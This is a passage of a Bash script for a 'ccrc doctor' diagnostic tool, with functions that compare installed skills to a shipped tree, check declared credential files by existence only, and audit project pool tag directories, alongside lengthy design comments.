  echo "FIX wrappers: ran the shipped tree's 'ccrc wrappers' with no flag (exit $rc) — it overwrites only a launcher whose ccrc marker still verifies, writes only where nothing is, and refuses every other file; the re-measurement below is the verdict"
}

# ── skills — every rostered home carries the SHIPPED skills ────────────────
# Release/rollout design §6. Compares each home's installed
# ccrc-coordinator/worker/reviewer against the TREE (`$BOX_TREE_DIR/ccd/
# <name>-skill`), the thing the build stamp names — not against the
# `.cc-sessions` placed copy: on 2026-09-17 both were stale while the tree
# on the box was current, and eighteen reviewers read an old clause. Homes
# come from `accounts.json` (`_check_credentials`' reader), so the check has
# a subject wherever `wrappers` does. graphify's skill has its own check —
# its source is the installed package, not this tree.
_check_skills() {
  local role=""
  # -f BEFORE -r (D-3025): a directory answers `-r` true too, and
  # `_box_env_value`'s `read … < "$file"` on a directory dies "Is a directory"
  # then "line: unbound variable" under `set -u`, taking the whole doctor run
  # down — the same guard order every other `BOX_ENV_FILE` reader in this file
  # already uses.
  [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ] && role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$role" = server ]; then
    _dr_skip skills "this box records CCRC_ROLE=server, so it hosts no sessions and no account's skills directory is its concern"
    return 3
  fi
  local tree="$BOX_TREE_DIR/ccd" name notree=""
  # EVERY missing one, in one line (R19, D-3112): the first-only probe sent an
  # operator back once per missing directory.
  for name in coordinator-skill worker-skill reviewer-skill; do
    [ -d "$tree/$name" ] || notree="$notree${notree:+, }$tree/$name"
  done
  if [ -n "$notree" ]; then
    _dr_fail skills "the shipped tree has no $notree, so nothing on this box says what the installed skills should be" \
      "run 'ccrc update' (or 'ccrc install' from a checkout) to place the shipped tree"
    return 1
  fi
  if ! command -v diff >/dev/null 2>&1; then
    _dr_warn skills "diff is not on PATH, so the installed skills could not be compared with the shipped tree" \
      "install diffutils"
    return 2
  fi
  local roster="$HOME/.ccrc/accounts.json"
  if [ ! -f "$roster" ] || [ ! -r "$roster" ]; then
    _dr_skip skills "no readable account roster at \$HOME/.ccrc/accounts.json — the 'wrappers' check above owns that"
    return 3
  fi
  if ! command -v node >/dev/null 2>&1; then
    _dr_fail skills "node is not on PATH, so \$HOME/.ccrc/accounts.json cannot be read" "install Node first — see the 'node' check above"
    return 1
  fi
  local rows rc
  rows="$(_skills_roster_rows "$roster")"; rc=$?
  if [ "$rc" -ne 0 ]; then
    _dr_skip skills "\$HOME/.ccrc/accounts.json could not be read as a roster — the 'wrappers' check above owns that"
    return 3
  fi
  # Two conditions used to share the "none of the config directories exist"
  # SKIP below: no rostered home on this box, and NO USABLE ROW at all (R19,
  # D-3112).
  if [ -z "$rows" ]; then
    _dr_skip skills "no usable account in \$HOME/.ccrc/accounts.json — the 'wrappers' check above owns that"
    return 3
  fi
  local id suffix dir homes=0 installed
  local -a stale=()
  while IFS=$'\t' read -r id suffix; do
    [ -n "$id" ] || continue
    dir="$HOME/$suffix"
    [ -d "$dir" ] || continue
    homes=$((homes + 1))
    for name in coordinator-skill worker-skill reviewer-skill; do
      installed="ccrc-${name%-skill}"
      if [ ! -d "$dir/skills/$installed" ]; then
        stale+=("$id: $installed missing"); continue
      fi
      diff -r -q "$tree/$name" "$dir/skills/$installed" >/dev/null 2>&1 || stale+=("$id: $installed differs")
    done
  done <<< "$rows"
  if [ "$homes" -eq 0 ]; then
    _dr_skip skills "none of the roster's config directories exist on this box, so there is no installed skill to compare"
    return 3
  fi
  if [ "${#stale[@]}" -eq 0 ]; then
    _dr_pass skills "$homes/$homes homes carry the shipped ccrc-coordinator, ccrc-worker and ccrc-reviewer"
    return 0
  fi
  # THE HEADLINE (R19, validated 2026-09-19, D-3112): an entry is "<id>: <skill>
  # differs" (the home's copy differs from the shipped tree) or "<id>: <skill>
  # missing" (absent from that home — the tree's own absence is the FAIL above,
  # with its own sentence). The count is of account-and-skill pairs, so
  # "installed skill(s)" misdescribed a missing one; this says both conditions
  # on the side they are on.
  #
  # THE REMEDY NAMES THE SHIPPED TREE'S OWN INSTALLERS, both halves (R12).
  # R10 already moved the SOURCE to `$BOX_TREE_DIR` — the tree this check
  # measured — while leaving the SCRIPT at `$HOME/.cc-sessions/…`, which is
  # the other copy that was stale on 2026-09-17, and which this check has
  # never measured. `ccd/install-*-skill.sh` ships in the tree (`_inst_tree`
  # rsyncs `ccd/` whole), so both halves can come from the one place the
  # build stamp stands behind. It also keeps `.cc-sessions/<dir>` spelled
  # exactly once in this file — `_check_pools`' own literal — which
  # `pool-name-parity.test.ts` pins. `ccrc doctor --fix` runs exactly this
  # remedy (`_fix_skills`, D-3113).
  _dr_fail skills "${#stale[@]} skill(s) in the rostered homes differ from the shipped tree or are missing from their home: $(_dr_join "${stale[@]}")" \
    "run 'ccrc doctor --fix' (the shipped tree's installers into every rostered home), or 'ccrc update' (re-places the tree and re-runs them) — or by hand: CCRC_SKILL_SRC=\"\$HOME/ccrc/ccd/coordinator-skill\" bash \"\$HOME/ccrc/ccd/install-coordinator-skill.sh\"; CCRC_SKILL_SRC=\"\$HOME/ccrc/ccd/worker-skill\" bash \"\$HOME/ccrc/ccd/install-worker-skill.sh\"; CCRC_SKILL_SRC=\"\$HOME/ccrc/ccd/reviewer-skill\" bash \"\$HOME/ccrc/ccd/install-reviewer-skill.sh\""
  return 1
}

# The roster rows `_check_skills` and `_fix_skills` both read: "<id>\t<suffix>"
# per usable account, exit 3 unreadable / 4 not a roster (the check's own
# codes, unchanged). One reader, so the cure converges exactly the homes the
# check measured.
_skills_roster_rows() {   # <roster path>
  CCRC_DOCTOR_ROSTER="$1" node -e '
    const fs = require("fs");
    let j;
    try { j = JSON.parse(fs.readFileSync(process.env.CCRC_DOCTOR_ROSTER, "utf8")); }
    catch (e) { process.exit(3); }
    if (!j || typeof j !== "object" || !Array.isArray(j.accounts)) process.exit(4);
    const ok = /^[a-z][a-z0-9-]{0,31}$/;
    const dir = /^\.[A-Za-z0-9._-]{1,64}$/;
    process.stdout.write(j.accounts
      .filter((a) => a && typeof a === "object" && ok.test(a.id) && typeof a.configDirSuffix === "string" && dir.test(a.configDirSuffix))
      .map((a) => a.id + "\t" + a.configDirSuffix).join("\n"));
  ' 2>/dev/null
}

# The cure `ccrc doctor --fix` runs for `skills` (R19, ruled 2026-09-19,
# D-3113): the shipped tree's OWN installers — the remedy the FAIL prints —
# into every rostered home that exists on this box. Idempotent; the check then
# measures again and the re-measurement is the verdict.
_fix_skills() {
  local tree="$BOX_TREE_DIR/ccd" roster="$HOME/.ccrc/accounts.json" rows id suffix dir name said n=0 list=""
  rows="$(_skills_roster_rows "$roster")" || { echo "FIX skills: refused — \$HOME/.ccrc/accounts.json could not be read as a roster"; return 1; }
  while IFS=$'\t' read -r id suffix; do
    [ -n "$id" ] || continue
    dir="$HOME/$suffix"
    [ -d "$dir" ] || continue
    for name in coordinator worker reviewer; do
      # The interpreter running THIS file, not whatever `bash` PATH resolves to —
      # doctor runs under a contained PATH in tests and under an operator's PATH
      # on a box, and the installer is bash either way.
      if ! said="$(CCRC_SKILL_SRC="$tree/$name-skill" "${BASH:-bash}" "$tree/install-$name-skill.sh" --homes "$dir" 2>&1)"; then
        echo "FIX skills: refused — $tree/install-$name-skill.sh --homes $dir said: ${said##*$'\n'}"; return 1
      fi
    done
    n=$((n + 1)); list="$list${list:+, }$id"
  done <<< "$rows"
  [ "$n" -gt 0 ] || { echo "FIX skills: nothing to cure — no rostered home exists on this box"; return 0; }
  echo "FIX skills: re-ran the shipped tree's installers into $n home(s): $list"
}

# ── the accounts surface, by existence ────────────────────────────────────
# TWO FACTS NOTHING ELSE ON THIS BOX MEASURES. `_check_wrappers` compares the
# roster against ~/.local/bin; neither of these files is there.
#   credential-declared-absent — the roster DECLARES a secretsFile and the file
#     is not on disk, so the lane looks configured and authenticates as nobody.
#     `secretsFile` is legal on `upstream` as a DECLARATION for exactly this
#     reason: it is the only way "the upstream account has a credential nobody
#     can see" becomes checkable at all.
#   settings-env-drift — a lane's settings.json `env` block disagrees with the
#     roster's provider config. The base URL and the model map live in that
#     block rather than in the wrapper, so it is the one place a lane can talk
#     somewhere the roster does not name while every other check passes.
#
# EXISTENCE ONLY, NEVER CONTENTS, for the credential half. Those files are 0600
# under a 0700 ~/.cc-secrets and CLAUDE.md's rule is absolute; the reader calls
# `existsSync` and reports a PATH. settings.json is a different class — a 0644
# config file whose key field this design deliberately leaves EMPTY — so it is
# read, and reported by key name and endpoint.
#
# `launcher-absent` IS NOT REPORTED HERE, and its absence is deliberate. It is
# the third member of the shared vocabulary because the PWA renders it on a
# card; doctor's renderer of it is `_check_wrappers`, whose `external)` arm has
# run `_dr_wr_present … wr_hard` since stage 2b. A second verdict line would
# count one finding twice — `_check_tmux_skew`'s own first arm is this file's
# ruling on that. The PASS detail below names which axes were measured, so a
# reader can see the third was asked elsewhere rather than not at all.
#
# NEVER A SKIP. A box with no roster is exactly the box whose operator most
# needs a line, and the roster's own health is `_check_wrappers`' FAIL one entry
# up — so this WARNs, says where that FAIL lives, and returns 2. THE ARM ORDER
# IS PART OF THAT: the roster test runs FIRST, because a box with no roster
# usually has no node stub either and the sentence its operator needs is about
# the roster.
_check_accounts() {
  # A server-role box hosts no sessions (D-3111): the installer converges
  # nothing per account there, so this check measures nothing there either —
  # the same sentence `_check_skills` has said since it shipped. `-f` before
  # `-r` (D-3025).
  local _srv_role=""
  # `${BOX_ENV_FILE:-}`: this file is sourced under `set -u` by callers that
  # are not `ccrc` (a test sources it bare and calls one check), so a bare
  # `$BOX_ENV_FILE` here is an unbound-variable death, not a skipped gate.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip accounts "this box records CCRC_ROLE=server, so it hosts no sessions and no account's credential or provider config on it is ccrc's concern"
    return 3
  fi
  local roster="$HOME/.ccrc/accounts.json" gen="$CCRC_HERE/../deploy/account-op.mjs"
  if [ ! -f "$roster" ] || [ ! -r "$roster" ]; then
    _dr_warn accounts "no readable account roster at \$HOME/.ccrc/accounts.json, so no account's credential or provider config was measured" \
      "the roster's own health is the wrappers check above — fix what it reports first, then re-run doctor"
    return 2
  fi
  if [ ! -f "$gen" ]; then
    _dr_warn accounts "the account helper did not ship ($gen), so no account's credential or provider config was measured" \
      "the helper lives one directory up from ccrc (at ~/ccrc/deploy on a deployed box): re-run the install, or redeploy, so ccrc and deploy/ come from one tree"
    return 2
  fi
  if ! command -v node >/dev/null 2>&1; then
    _dr_warn accounts "node is not on PATH, so \$HOME/.ccrc/accounts.json could not be read" \
      "install Node first — see the 'node' check above"
    return 2
  fi

  local out rc=0
  out="$(node "$gen" doctor --file "$roster" --home "$HOME" 2>/dev/null)" || rc=$?
  if [ "$rc" -ne 0 ]; then
    _dr_warn accounts "\$HOME/.ccrc/accounts.json could not be read as a roster, so no account's credential or provider config was measured" \
      "the roster's own health is the wrappers check above — fix what it reports first, then re-run doctor"
    return 2
  fi

  # ONE LINE PER FINDING, plus one COUNTS line, TAB-separated and read into FOUR
  # variables. Three of the four fields the helper writes are non-empty by
  # construction (a code, a sentence, a number) — the id is NOT: its producer,
  # `opDoctor` (`deploy/account-op.mjs`), documents in capitals that IT DOES
  # NOT VALIDATE THE ROSTER, with several lines arguing why it must not, so an
  # id-less account's row carries an EMPTY id field (`Array.prototype.join`
  # renders `undefined` as `''`). CLAUDE.md's measured TSV hazard (D-71) — TAB
  # is an IFS whitespace character, so a run of them collapses and shifts
  # every field after an empty one — IS LIVE for that field: `read` collapses
  # the empty id into the message that follows it, and the message prints
  # where the id should be. A finding's absent fourth field is still TRAILING,
  # which `read` leaves empty without shifting anything.
  # `_dr_line` squashes embedded newlines out of both halves, so the findings
  # join onto ONE verdict line and the remedy stays the line after it.
  local -a findings=()
  local n_acct=0 n_cred=0 n_env=0
  local code a b c
  while IFS=$'\t' read -r code a b c; do
    [ -n "$code" ] || continue
    if [ "$code" = COUNTS ]; then n_acct="$a"; n_cred="$b"; n_env="$c"; continue; fi
    findings+=("$code: $a — $b")
  done <<<"$out"

  # THE COUNTS ARE THE MEASUREMENT (this file's "never the bare word ok" rule),
  # and they come from the SAME run that produced the findings.
  if [ "${#findings[@]}" -eq 0 ]; then
    _dr_pass accounts "$n_acct account(s): $n_cred declared credential file(s), all present; $n_env provider env block(s), all agreeing with the roster (an account's launcher is the wrappers check's subject, not this one)"
    return 0
  fi
  _dr_warn accounts "$(_dr_join "${findings[@]}")" \
    "a declared credential file that is not on disk is re-written by: ccrc account credential --id <id> --credential - ; a drifted env block by re-running the lane's provisioning, whose settings.json merge is idempotent"
  return 2
}

# ── credentials: does every account this box will PROBE have a token file? ──
# `ccd-account-health` measures declared Anthropic setup-token credentials, not
# every `telemetry: "anthropic"` account. Telemetry controls usage publishing;
# it says nothing about a lane's authentication shape. An upstream declaration
# wins, otherwise only the upstream retains the legacy `<id>-oauth.env` path. A
# generated Anthropic lane needs a declared setup-token path. API-key, login,
# external and Codex lanes are not usage-endpoint subjects: a stale guessed OAuth
# file must not bless or condemn them.
#
# READ BY NODE, NOT JQ, for `_check_wrappers`' stated reason: this check must not
# fail for a reason that belongs to another one, and a box with no jq already
# gets exactly one FAIL, from the jq check. The raw roster has not passed
# `parseRoster`, so the selector accepts only a safe relative path before Bash
# joins it to `$HOME`; an invalid declaration is a named FAIL, not a path lookup.
#
# NOT ONE BYTE OF ANY FILE IS READ. `[ -s ]` answers existence and non-emptiness
# together, which is the whole question — and this file's standing rule (see
# `_check_config`) is that a credential is reported as SET or NOT SET and never
# quoted at a terminal an operator pastes into a ticket.
#
# SKIP, NOT PASS, ON AN ABSENT OR UNREADABLE ROSTER: `_check_wrappers` above
# already owns "this box has no roster", and two checks measuring one thing is
# how they come to disagree. Skip on ZERO eligible accounts too — a scan over an
# empty list passes everything, and a doctor reporting agreement nobody measured
# is the worst failure this verb has.
_check_credentials() {
  local roster="$HOME/.ccrc/accounts.json"
  if [ ! -f "$roster" ] || [ ! -r "$roster" ]; then
    _dr_skip credentials "no readable account roster at \$HOME/.ccrc/accounts.json — the 'wrappers' check above owns that"
    return 3
  fi
  if ! command -v node >/dev/null 2>&1; then
    _dr_fail credentials "node is not on PATH, so \$HOME/.ccrc/accounts.json cannot be read" \
      "install Node first — see the 'node' check above"
    return 1
  fi
  local subjects rc
  subjects="$(CCRC_DOCTOR_ROSTER="$roster" node -e '
    const fs = require("fs");
    let j;
    try { j = JSON.parse(fs.readFileSync(process.env.CCRC_DOCTOR_ROSTER, "utf8")); }
    catch (e) { process.exit(3); }
    if (!j || typeof j !== "object" || !Array.isArray(j.accounts)) process.exit(4);
    const idOk = (v) => typeof v === "string" && /^[a-z][a-z0-9-]{0,31}$/.test(v);
    const pathOk = (v) => typeof v === "string" && v !== "" && !v.startsWith("/")
      && !v.endsWith("/") && !v.includes("..") && /^[A-Za-z0-9._/-]+$/.test(v);
    for (const a of j.accounts) {
      if (!a || typeof a !== "object" || a.telemetry !== "anthropic" || !idOk(a.id)) continue;
      const e = a.exec;
      let state = "unsupported", rel = "";
      if (e && typeof e === "object" && e.kind === "upstream") {
        rel = Object.hasOwn(e, "secretsFile") ? e.secretsFile : `.cc-secrets/${a.id}-oauth.env`;
        state = pathOk(rel) ? "eligible" : "invalid";
      } else if (e && typeof e === "object" && e.kind === "generated") {
        const provider = Object.hasOwn(e, "provider") ? e.provider : "anthropic";
        if (provider === "anthropic") {
          if (Object.hasOwn(e, "secretsFile")) {
            rel = e.secretsFile;
            state = pathOk(rel) ? "eligible" : "invalid";
          } else state = "login";
        } else if (typeof provider === "string") state = "api-key";
      }
      process.stdout.write(`${a.id}\t${state}\t${state === "eligible" ? rel : ""}\n`);
    }
  ' 2>/dev/null)"; rc=$?
  if [ "$rc" -ne 0 ]; then
    _dr_skip credentials "\$HOME/.ccrc/accounts.json could not be read as a roster — the 'wrappers' check above owns that"
    return 3
  fi
  if [ -z "$subjects" ]; then
    _dr_skip credentials "no account on this box declares an OAuth setup-token credential, so there is nothing for the OAuth usage probe to measure"
    return 3
  fi
  local id state rel n=0 miss=0 invalid=0 all_under_secrets=1
  local -a eligible=() bad=()
  while IFS=$'\t' read -r id state rel <&8; do
    case "$state" in
      eligible)
        n=$((n + 1))
        eligible+=("$id:$rel")
        [[ "$rel" == .cc-secrets/* ]] || all_under_secrets=0
        ;;
      invalid)
        invalid=$((invalid + 1))
        bad+=("$id has an invalid declared setup-token credential path")
        ;;
      api-key|login|unsupported) ;;
      *)
        invalid=$((invalid + 1))
        bad+=("$id has an unrecognised credential subject")
        ;;
    esac
  done 8<<< "$subjects"
  if [ "$invalid" -gt 0 ]; then
    _dr_fail credentials "$(_dr_join "${bad[@]}")" \
      "fix each declared setup-token credential path to be a safe relative path under \$HOME; the account-health probe refuses malformed declarations"
    return 1
  fi
  if [ "$n" -eq 0 ]; then
    _dr_skip credentials "no account on this box declares an OAuth setup-token credential, so there is nothing for the OAuth usage probe to measure"
    return 3
  fi
  # A fresh, legacy-shaped box has no credentials directory until provisioning,
  # so it SKIPs instead of blocking the install that must happen first. A
  # declared path elsewhere is already a specific claim and remains a FAIL below.
  if [ "$all_under_secrets" -eq 1 ] && [ ! -d "$HOME/.cc-secrets" ]; then
    _dr_skip credentials "no \$HOME/.cc-secrets directory — this box has not been provisioned with setup-token credentials yet; run again once each declared credential file exists"
    return 3
  fi
  local item f
  for item in "${eligible[@]}"; do
    id="${item%%:*}"
    rel="${item#*:}"
    f="$HOME/$rel"
    [ -s "$f" ] && continue
    miss=$((miss + 1))
    bad+=("$id has no readable token at \$HOME/$rel")
  done
  if [ "$miss" -gt 0 ]; then
    _dr_fail credentials "$(_dr_join "${bad[@]}")" \
      "the account-health probe refuses an account with no setup token, so its liveness is never measured — put the account's CLAUDE_CODE_OAUTH_TOKEN in its declared file (0600)"
    return 1
  fi
  _dr_pass credentials "$n account(s) declaring an OAuth setup-token credential, each with a readable token file"
}

# ── the project pool tags (account pools, spec §5.4.6) ────────────────────
# `$HOME/.cc-sessions/pools/<project>` is one file per tagged project, holding
# one token. This check REPORTS and RESOLVES NOTHING — `_check_wrappers`'s own
# contract — because every finding here is either an operator's intent to
# revise or a permission bit no doctor should silently change.
#
# THE GRAMMAR IS SPELLED HERE, and that is D-92's trade rather than an
# oversight: this file is sourced under `set -u` by things that are not `ccrc`
# (`ccrc-doctor.test.ts`'s `tableNames()`), so a top-level reference to `ccd`'s
# `POOL_NAME_RE` would make sourcing it FAIL, and a `${…:-…}` fallback is the
# second spelling with a branch in front of it. `CCRC_RC_FILE` above makes the
# identical trade. What is different from `ccrc-wrapper-shape`'s hand-copy of
# `ID_RE` is that this one is PINNED: `server/test/pool-name-parity.test.ts`
# extracts all three spellings — TypeScript, `ccd/ccd`, and this line — and
# holds them byte-equal.
POOL_NAME_RE='^[a-z][a-z0-9-]{0,31}$'
# Builtin substitute for `grep -qxF`: exact-line membership, nothing more.
# NOT "no fork ever" — `stat`, `date`, `df` and `readlink` are all forked
# elsewhere in this file, so that claim would be false in one grep. What is
# true of every one of THOSE forks is that each sits behind its own
# `command -v` guard and DISCLOSES its own blindness when the binary is
# absent ("df is not on PATH, so this check cannot measure free space",
# "$sys is a SYMLINK (target unreadable)"). The dictated `cat`/`grep` version
# here had no such guard: under `ccrc-doctor.test.ts`'s own harness (which
# hands a check exactly the binaries it stubbed, nothing else — measured,
# exit 127) it silently collapsed "no `cat` on PATH" into a REAL verdict
# class, `pools-unreadable` — an adapter narrowing a distinction it received.
# Keeping the fork would have needed the guard PLUS a seventh "could not
# measure" class; a builtin read needs neither and leaves the doctor honest
# on a broken box. It also buys back a correctness property for free:
# `cat -- "$f"` may never block, and a FIFO under `pools/` would hang
# `open(2)` forever — the `-f` gate below is what `_project_pool_state`
# itself uses this same read for, and for the identical reason.
_pool_has_line() {   # needle haystack -> 0 iff needle is one whole line of haystack
  local needle="$1" hay="$2" line
  while IFS= read -r line || [ -n "$line" ]; do
    [ "$line" = "$needle" ] && return 0
  done <<< "$hay"
  return 1
}
_check_pools() {
  # A server-role box hosts no sessions (D-3111): the installer converges
  # nothing per account there, so this check measures nothing there either —
  # the same sentence `_check_skills` has said since it shipped. `-f` before
  # `-r` (D-3025).
  local _srv_role=""
  # `${BOX_ENV_FILE:-}`: this file is sourced under `set -u` by callers that
  # are not `ccrc` (a test sources it bare and calls one check), so a bare
  # `$BOX_ENV_FILE` here is an unbound-variable death, not a skipped gate.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip pools "this box records CCRC_ROLE=server, so it hosts no sessions and no pool marker on it is ccrc's concern"
    return 3
  fi
  # THE `pools` SEGMENT BELOW IS THE THIRD SPELLING of a name TypeScript holds
  # as `POOLS_DIR_NAME` (`server/src/pools.ts`) and `ccd/ccd` as
  # `POOLS_DIR="$REG/pools"`. It is spelled out rather than derived for the
  # reason `POOL_NAME_RE` above gives — this file is sourced under `set -u` by
  # things that are not `ccrc`, so it can reference no other tool's variable —
  # and, like that one, it is PINNED: `pool-name-parity.test.ts` extracts every
  # `.cc-sessions/<segment>` literal in this file, holds the one it finds equal
  # to `POOLS_DIR_NAME`, and then RUNS this check against a tag planted at the
  # directory that constant names. Renaming the directory in the two files that
  # already had pins, and not here, is red twice over.
  local dir="$HOME/.cc-sessions/pools" reg="$HOME/.cc-sessions" proot="$HOME/projects"
  # SAME SHADOW AS THE READER, FOR THE SAME THREE DECISIONS (D-2520/D-2522).
  # This check is the THIRD reader of the tag — it repeats `ccd`'s `-n 64` cap,
  # its `[[:space:]]` strip and its `POOL_NAME_RE`, and it is pinned byte-equal
  # to both other spellings. Byte-equal is not behaviour-equal while the locale
  # is free, so a doctor run under one environment could pass a tag that the
  # reader under another calls `malformed` — the check disagreeing with the
  # thing it exists to check. Shadow it here too, or the parity this file
  # asserts is textual only.
  local LC_ALL=C
  # `$REG` UNSEARCHABLE IS NOT `$REG` ABSENT, and the absence branch below
  # cannot tell them apart — checked FIRST, ahead of it, because that branch
  # is the one that answers. `-e "$dir"` and `-L "$dir"` are BOTH false when
  # `$reg` itself is mode 000: neither predicate can stat OR lstat through a
  # directory it may not search, so the pair D-1848 requires (which closes the
  # dangling-symlink and loop shapes on `$dir` itself, and does close them)
  # sails straight into the PASS. Measured before this guard: with `$reg` at
  # mode 000 and a legal tag under it, this check printed `PASS pools: no
  # project pools tagged (…/pools does not exist) — every project is
  # unconstrained` while `_project_pool_state demo` answered `unreadable` and
  # every placement decision on the box REFUSED. That is the reassuring-PASS
  # inversion D-1848 was numbered for, one level up from where it looked.
  #
  # NOT THE READER'S WHOLE TEST, DELIBERATELY — and this is the one place this
  # check may not mirror `_project_pool_state`. That reader answers
  # `unreadable` for an ABSENT `$REG` too (`[[ -d "$REG" && -x "$REG" ]]`), on
  # a branch its own comment calls unreachable, because `ccd` runs `mkdir -p
  # "$REG"` at source time. `ccrc doctor` has no such guarantee: it runs on the
  # SERVER box as well, which owns no `~/.cc-sessions` at all, and there
  # "nothing is tagged, every project is unconstrained" is the truth rather
  # than an unmeasured guess. So this refuses only what it can positively
  # measure as PRESENT and unusable — a `$reg` that exists (or is a symlink
  # that exists as one) and is not a searchable directory — and leaves genuine
  # absence to the branch below. Both halves are pinned: `ccrc-doctor.test.ts`
  # has a mode-000-`$reg` case that must FAIL and a no-`$reg` case that must
  # PASS.
  if { [ -e "$reg" ] || [ -L "$reg" ]; } && { [ ! -d "$reg" ] || [ ! -x "$reg" ]; }; then
    _dr_fail pools "pools-unlistable: $reg is not a searchable directory, so nothing under it — $dir included — can be reached, and ccd answers unreadable for EVERY project on a box shaped like this" \
      "fix what is at that path — check with: ls -ld $reg"
    return 1
  fi
  # `-e` alone is FALSE for a DANGLING symlink — the same defect this wave has
  # already fixed twice in `ccd/ccd` (its reader, `_project_pool_state`, and
  # its writer verb): "not `-e`" reads as absence when it is not. A
  # half-finished `ln -s` after moving the registry must not print this box's
  # most reassuring PASS while `ccd` answers `unreadable` for EVERY project —
  # so a dangling (or looping) `$dir` falls through to the unlistable check
  # below instead of returning here.
  if [ ! -e "$dir" ] && [ ! -L "$dir" ]; then
    _dr_pass pools "no project pools tagged ($dir does not exist) — every project is unconstrained, which is the pre-pools behaviour"
    return 0
  fi
  # TWO CONDITIONS, NOT ONE (D-1851) — split in fix round 7, because the single test
  # that stood here FAILED on a box where `ccd` works perfectly. `-r` and `-x`
  # on a directory are different permissions answering different questions:
  # SEARCH (`-x`) is all `_project_pool_state` needs, because it stats one
  # known path (`$POOLS_DIR/<project>`) and never enumerates; LIST (`-r`) is
  # what THIS check needs and the reader never does. A `pools/` at mode `--x`
  # therefore has every tag readable by the authority and no tag visible to
  # the doctor — and the old test called that `pools-unlistable: … so no
  # project's tag can be read — ccd reads this same path`, which is false in
  # both halves. A doctor that FAILs a healthy box is the cross-file
  # disagreement class this wave keeps finding, pointed at itself.
  #
  # A regular file, a dangling symlink, or a directory nobody may search: ccd
  # cannot reach a tag either, and answers `unreadable` for every project.
  if [ ! -d "$dir" ] || [ ! -x "$dir" ]; then
    _dr_fail pools "pools-unlistable: $dir is not a searchable directory, so no project's tag can be read — ccd reads this same path and answers unreadable for every project" \
      "fix what is at that path — check with: ls -ld $dir"
    return 1
  fi
  # Searchable but not listable: placement is UNAFFECTED and this check is
  # blind. WARN, and say which of the two it is — a separate class from
  # `pools-unlistable` because the remedy is the same command but the CLAIM is
  # the opposite one ("nothing works" vs "everything works, nobody can audit
  # it"), and `_dr_warn`/`_dr_fail` are not interchangeable printers.
  if [ ! -r "$dir" ]; then
    _dr_warn pools "pools-unenumerable: $dir cannot be listed, so this check can audit no tag — but it is searchable, so ccd reads every tag it is given a project name for and placement is unaffected" \
      "make it listable if you want this check to see it — ls -ld $dir"
    return 2
  fi

  # ONE BUCKET PER REMEDY, this file's standing rule: two conditions cured by
  # the same command share a verdict line; a condition with a DIFFERENT cure
  # gets its own line and its own remedy. Five buckets, five different cures.
  local p_leak=() p_unread=() p_malformed=() p_stale=() p_orphan=()
  # The pool vocabulary the FLEET obeys — `~/.ccrc/accounts.sh`, the generated
  # projection, not `accounts.json`. Sourced in a SUBSHELL so nothing it
  # defines lands in doctor's namespace. When it cannot be read the orphan arm
  # makes NO CLAIM (an empty `known`): `_check_wrappers` already FAILs loudly
  # for a missing or unreadable roster with its own remedy, and inventing a
  # second verdict for the same condition would hand one fact two vocabularies.
  # THREE STATES, NOT TWO, AND `known` CAN ONLY CARRY TWO. An empty `known`
  # means "the read failed" OR "the read succeeded and no account is tagged" —
  # and the SECOND is every box on this fleet until someone tags the first
  # account. Reading emptiness as failure is the overloaded-null rule (this
  # wave's own rule) inverted: D-1744 folded `unreadable` into a benign state,
  # and the first version of the PASS below folded a benign state into
  # `unreadable`, telling every operator that a file it had just read fine
  # could not be read. `[ -r … ]` above already ESTABLISHED that it was
  # readable and the old code then threw that away and re-inferred it from an
  # empty result. So the outcome is carried separately from the content: a
  # sentinel first line, printed only when the source and the `declare -F`
  # both succeeded, is what says MEASURED. Nothing else can — an empty
  # vocabulary and a failed read produce the same empty string by
  # construction. `|| :` inside the loop is KEPT — it costs nothing — but it
  # is not what stands between an ordinary untagged account and a false
  # `unmeasured` against the file this fleet actually runs. Measured on bash
  # 5.2.21, a `case` that matches no arm returns rc 0, and an empty
  # `case … esac` — the exact shape `shared/generate.mjs` emits for
  # `_ccrc_pool` unconditionally, and documents in its own comment ("An
  # empty `case … esac` is valid bash and answers empty at rc 0, which is
  # exactly the contract") — returns 0 too. So `_ccrc_pool` cannot fail on
  # an untagged or unknown id against a GENERATED `accounts.sh`, which is
  # this file's only writer, and the `measured` sentinel above already
  # carries the third state on its own, unconditionally. What the `|| :`
  # nets is an OUT-OF-CONTRACT `_ccrc_pool` — one whose body does not honour
  # the generator's own "case ends 0" promise — not a shape anyone has
  # measured to exist on this fleet: nothing writes `accounts.sh` but
  # `shared/generate.mjs`.
  local known="" vocab=unmeasured raw=""
  if [ -r "$HOME/.ccrc/accounts.sh" ]; then
    raw="$( . "$HOME/.ccrc/accounts.sh" 2>/dev/null \
      && declare -F _ccrc_pool >/dev/null 2>&1 \
      && { printf 'measured\n'; for a in "${CCRC_ACCOUNTS[@]}"; do _ccrc_pool "$a" || :; done; } )" || raw=""
    if [ "${raw%%$'\n'*}" = measured ]; then
      vocab=measured
      known="${raw#measured}"; known="${known#$'\n'}"
    fi
  fi

  # This box's `*.project` registry rows, read ONCE rather than once per tag —
  # matching `known` above, and for the same reason. Builtin-read (`$(< "$rf")`,
  # not `cat`; see `_pool_has_line`'s own header for why neither this file nor
  # any check in it may fork a coreutil).
  local reg_rows="" rf
  for rf in "$reg"/*.project; do
    [ -e "$rf" ] && [ -f "$rf" ] && [ -r "$rf" ] || continue
    reg_rows+="$(< "$rf")"$'\n'
  done

  local n f v
  # `*` ALONE never matches a dot-leading name (bash's default, no `dotglob`),
  # so the tmp-leak bucket below would be permanently empty without the two
  # extra patterns — `.[!.]*` and `..?*` are the standard dotglob-free way to
  # add "every dot-leading name except `.` and `..`" (measured: the bare `*`
  # form silently never saw a `.demo.4242.tmp` fixture at all).
  for f in "$dir"/* "$dir"/.[!.]* "$dir"/..?*; do
    # `-e` alone would drop a DANGLING symlink here — an unmatched glob and a
    # real-but-broken tag are not the same thing, and only the glob case may
    # be skipped silently. `-L` catches it; the `-f`/`-r` bucket below then
    # answers it `pools-unreadable` on its own, exactly like any other tag
    # that exists and cannot be read.
